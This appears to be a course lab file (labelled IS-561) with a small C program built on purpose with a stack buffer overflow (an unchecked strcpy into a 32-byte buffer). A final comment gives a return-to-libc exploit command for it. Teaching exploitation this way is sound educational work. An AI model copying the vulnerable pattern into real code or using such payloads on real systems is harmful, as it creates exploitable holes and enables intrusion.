// IS-561

#include <stdio.h>
#include <string.h>

void exploitme(char* input)
{
  char buf[32];
  strcpy(buf, input);
  puts(buf);
}

int main(int argc, char* argv[])
{
  if ( argc < 2 ) return -1;

  exploitme(argv[1]);

  return 0;
}

// ./nxstack "$(perl -e 'print "A"x36 . "\x50\xc8\xe4\xf7" . "AAAA" . "\xc8\xf7\xf6\xf7"')"
